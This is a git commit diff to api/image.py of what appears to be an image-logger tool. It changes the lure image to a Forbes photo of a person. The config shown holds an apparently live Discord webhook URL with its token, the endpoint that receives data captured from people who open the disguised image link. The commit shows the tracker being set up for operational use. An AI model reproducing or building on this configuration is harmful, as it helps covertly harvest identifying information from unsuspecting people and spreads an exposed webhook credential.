e750b971a6bd5fc85b3ab7edae5df3fef562d595
ignaziopachecoleone-sys <ignaziopachecoleone@gmail.com>
2026-01-19 20:38:27 -0500

    Update image URL in configuration

--- api/image.py
+++ api/image.py
@@ -14,7 +14,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1462954270491152404/6xg1J09pqxufBjL_Xrbn_Jz2ecCMifDcAZQVHWSUQBtDdggtpXge-g37VscY6PrwQjAy",
-    "image": "https://reedhoffmann.com/wp-content/uploads/2022/03/JPEG_007.jpg", # You can also have a custom image by using a URL argument
+    "image": "https://imageio.forbes.com/specials-images/imageserve/5d35eacaf1176b0008974b54/0x0.jpg?format=jpg&crop=4560,2565,x790,y784,safe&width=1200", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
